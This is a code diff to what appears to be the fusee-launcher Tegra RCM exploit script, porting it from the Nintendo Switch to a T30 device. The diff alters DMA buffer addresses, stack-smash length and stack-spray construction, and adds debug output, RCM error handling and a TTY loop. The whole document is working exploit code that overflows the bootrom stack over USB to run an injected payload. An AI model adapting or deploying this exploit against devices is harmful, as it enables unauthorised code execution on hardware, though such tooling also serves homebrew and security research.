@@ -33,6 +33,7 @@ import errno
 import ctypes
 import argparse
 import platform
+import binascii
 
 USB_XFER_MAX = 0x1000
 
@@ -48,7 +49,7 @@ RCM_PAYLOAD_ADDR    = 0x4000A000
 # The address where the user payload is expected to begin.
 PAYLOAD_START_ADDR  = 0x4000AE40
 
-# Specify the range of addresses where we should inject oct
+# Specify the range of addresses where we should inject our
 # payload address.
 STACK_SPRAY_START   = 0x4000EE40
 STACK_SPRAY_END     = 0x40011000
@@ -133,7 +134,7 @@ class HaxBackend:
 
     def write_single_buffer(self, data):
         """
-        Writes a single RCM buffer, which should be 0x1000 long.
+        Writes a single RCM buffer, which should be USB_XFER_MAX long.
         The last packet may be shorter, and should trigger a ZLP (e.g. not divisible by 512).
         If it's not, send a ZLP.
         """
@@ -143,6 +144,8 @@ class HaxBackend:
     def find_device(self, vid=None, pid=None):
         """ Set and return the device to be used """
 
+        # os.environ['PYUSB_DEBUG'] = 'debug'
+        os.environ['PYUSB_DEBUG'] = 'info'
         import usb
 
         self.dev = usb.core.find(idVendor=vid, idProduct=pid)
@@ -163,7 +166,10 @@ class MacOSBackend(HaxBackend):
     def trigger_vulnerability(self, length):
 
         # Triggering the vulnerability is simplest on macOS; we simply issue the control request as-is.
-        return self.dev.ctrl_transfer(self.STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT, self.GET_STATUS, 0, 0, length)
+        r = self.dev.ctrl_transfer(self.STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT, self.GET_STATUS, 0, 0, length)
+        print("ctrl res:")
+        print(r)
+        return r
 
 
 
@@ -451,13 +457,13 @@ class WindowsBackend(HaxBackend):
 
 class RCMHax:
 
-    # Default to the Nintendo Switch RCM VID and PID.
+    # Default to the T30 RCM VID and PID.
     DEFAULT_VID = 0x0955
     DEFAULT_PID = 0x7330
 
     # Exploit specifics
-    COPY_BUFFER_ADDRESSES   = [0x40005000, 0x40009000]   # The addresses of the DMA buffers we can trigger a copy _from_.
-    STACK_END               = 0x40010000                 # The address just after the end of the device's stack.
+    COPY_BUFFER_ADDRESSES   = [0x40003000, 0x40003000]   # The addresses of the DMA buffers we can trigger a copy _from_.
+    STACK_END               = 0x4000A000                 # The address just after the end of the device's stack.
 
     def __init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False):
         """ Set up our RCM hack connection."""
@@ -517,26 +523,37 @@ class RCMHax:
         """ Writes data to the main RCM protocol endpoint. """
 
         length = len(data)
-        packet_size = 0x1000
+        print("txing {} bytes total".format(length))
+        packet_size = USB_XFER_MAX
+        length_sent = 0
 
         while length:
             data_to_transmit = min(length, packet_size)
+            print("txing {} bytes ({} already sent)".format(data_to_transmit, length_sent))
             length -= data_to_transmit
 
             chunk = data[:data_to_transmit]
             data  = data[data_to_transmit:]
             self.write_single_buffer(chunk)
+            length_sent += data_to_transmit
 
 
     def write_single_buffer(self, data):
         """
-        Writes a single RCM buffer, which should be 0x1000 long.
+        Writes a single RCM buffer, which should be USB_XFER_MAX long.
         The last packet may be shorter, and should trigger a ZLP (e.g. not divisible by 512).
         If it's not, send a ZLP.
         """
         self._toggle_buffer()
-        return self.backend.write_single_buffer(data)
-
+        try:
+            return self.backend.write_single_buffer(data)
+        except Exception as err:
+            print("USBError: {}".format(err))
+            rcm_err = self.read(4)
+            # print("RCM error buf: {}".format(rcm_err))
+            rcm_err_int = ctypes.c_uint32.from_buffer_copy(rcm_err).value
+            # print("RCM error buf: 0x{:08x}".format(rcm_err_int))
+            raise RCMError(rcm_err_int)
 
     def _toggle_buffer(self):
         """
@@ -560,7 +577,7 @@ class RCMHax:
         """ Switches to the higher RCM buffer, reducing the amount that needs to be copied. """
 
         if self.get_current_buffer_address() != self.COPY_BUFFER_ADDRESSES[1]:
-            self.write(b'\0' * 0x1000)
+            self.write(b'\0' * USB_XFER_MAX)
 
 
     def trigger_controlled_memcpy(self, length=None):
@@ -568,7 +585,9 @@ class RCMHax:
 
         # Determine how much we'd need to transmit to smash the full stack.
         if length is None:
-            length = self.STACK_END - self.get_current_buffer_address()
+            length = self.STACK_END - self.get_current_buffer_address() - 0x20
+
+        print("sending status request with length {}".format(length))
 
         return self.backend.trigger_vulnerability(length)
 
@@ -587,6 +606,7 @@ parser.add_argument('--override-os', metavar='platform', dest='platform', type=s
 parser.add_argument('--relocator', metavar='binary', dest='relocator', type=str, default="%s/intermezzo.bin" % os.path.dirname(os.path.abspath(__file__)), help='provides the path to the intermezzo relocation stub')
 parser.add_argument('--override-checks', dest='skip_checks', action='store_true', help="don't check for a supported controller; useful if you've patched your EHCI driver")
 parser.add_argument('--allow-failed-id', dest='permissive_id', action='store_true', help="continue even if reading the device's ID fails; useful for development but not for end users")
+parser.add_argument('--tty', dest='tty_mode', action='store_true', help="Enable TTY mode after payload launch")
 arguments = parser.parse_args()
 
 # Expand out the payload path to handle any user-refrences.
@@ -612,7 +632,7 @@ except IOError as e:
 # Print the device's ID. Note that reading the device's ID is necessary to get it into
 try:
     device_id = switch.read_device_id()
-    print("Found a Tegra with Device ID: {}".format(device_id))
+    print("Found a Tegra with Device ID: {}".format(binascii.hexlify(device_id)))
 except OSError as e:
     # Raise the exception only if we're not being permissive about ID reads.
     if not arguments.permissive_id:
@@ -622,17 +642,25 @@ except OSError as e:
 # Prefix the image with an RCM command, so it winds up loaded into memory
 # at the right location (0x40010000).
 
+RCM_HEADER_SIZE = RCM_V1_HEADER_SIZE
+
 # Use the maximum length accepted by RCM, so we can transmit as much payload as
 # we want; we'll take over before we get to the end.
-length  = 0x30298
+# length  = 0x30298
+length  = 0x30000 + RCM_HEADER_SIZE - 0x10
+# length  = 0x0001f814
 payload = length.to_bytes(4, byteorder='little')
+print("Setting rcm msg size to 0x{:08x}".format(length))
+print("RCM payload (len_insecure): {}".format(payload.hex()))
 
-# pad out to 680 so the payload starts at the right address in IRAM
-payload += b'\0' * (680 - len(payload))
+# pad out to RCM_HEADER_SIZE so the payload starts at the right address in IRAM
+payload += b'\0' * (RCM_HEADER_SIZE - len(payload))
 
 # Populate from [RCM_PAYLOAD_ADDR, INTERMEZZO_LOCATION) with the payload address.
 # We'll use this data to smash the stack when we execute the vulnerable memcpy.
 print("\nSetting ourselves up to smash the stack...")
+
+print("Payload offset of intermezzo: 0x{:08x}".format(len(payload)))
 
 # Include the Intermezzo binary in the command stream. This is our first-stage
 # payload, and it's responsible for relocating the final payload to 0x40010000.
@@ -642,33 +670,28 @@ with open(intermezzo_path, "rb") as f:
     intermezzo_size = len(intermezzo)
     payload        += intermezzo
 
+print("intermezzo size: 0x{:08x}".format(intermezzo_size))
 
-# Pad the payload till the start of the user payload.
-padding_size   = PAYLOAD_START_ADDR - (RCM_PAYLOAD_ADDR + intermezzo_size)
-payload += (b'\0' * padding_size)
+assert(intermezzo_size % 4 == 0)
 
-target_payload = b''
-
-# Read the user payload into memory.
-with open(payload_path, "rb") as f:
-    target_payload = f.read()
-
-# Fit a collection of the payload before the stack spray...
-padding_size   = STACK_SPRAY_START - PAYLOAD_START_ADDR
-payload += target_payload[:padding_size]
+print("Payload offset of stack spray: 0x{:08x}".format(len(payload)))
 
 # ... insert the stack spray...
-repeat_count = int((STACK_SPRAY_END - STACK_SPRAY_START) / 4)
+repeat_count = int((length - USB_XFER_MAX - len(payload)) / 4)
+print("injecting {} copies of payload address".format(repeat_count))
 payload += (RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * repeat_count)
 
-# ... and follow the stack spray with the remainder of the payload.
-payload += target_payload[padding_size:]
+print("Payload offset after stack spray 0x{:08x}".format(len(payload)))
 
 # Pad the payload to fill a USB request exactly, so we don't send a short
 # packet and break out of the RCM loop.
 payload_length = len(payload)
-padding_size   = 0x1000 - (payload_length % 0x1000)
+padding_size   = USB_XFER_MAX - (payload_length % USB_XFER_MAX)
+print("End padding size 0x{:08x}".format(padding_size))
+
 payload += (b'\0' * padding_size)
+
+print("Payload offset of end of payload 0x{:08x}".format(len(payload)))
 
 # Check to see if our payload packet will fit inside the RCM high buffer.
 # If it won't, error out.
@@ -695,4 +718,10 @@ except ValueError as e:
 except IOError:
     print("The USB device stopped responding-- sure smells like we've smashed its stack. :)")
     print("Launch complete!")
+
+if arguments.tty_mode:
+    while True:
+        buf = switch.read(USB_XFER_MAX)
+        print(binascii.hexlify(buf))
+        print(buf.decode('utf-8'))
 
